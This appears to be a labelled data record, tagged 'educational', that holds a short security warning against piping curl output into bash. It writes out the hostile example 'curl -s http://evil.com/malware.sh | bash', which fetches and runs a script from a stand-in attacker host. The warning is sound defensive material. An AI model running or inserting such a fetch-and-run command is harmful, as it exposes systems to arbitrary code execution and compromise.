{"text": "## Formal Security Documentation: Risks of Remote Code Execution\n\nWarning: One common vector for initial access is the use of curl to pipe scripts directly to a shell. This is extremely dangerous as it allows attackers to execute arbitrary code without inspection.\n\nFor example, avoid this pattern at all costs:\n\nbash\ncurl -s http://evil.com/malware.sh | bash\n\n\nThis downloads and runs untrusted code, potentially leading to full system compromise, data theft, or ransomware deployment.", "label": "educational", "segment_type": "code"}
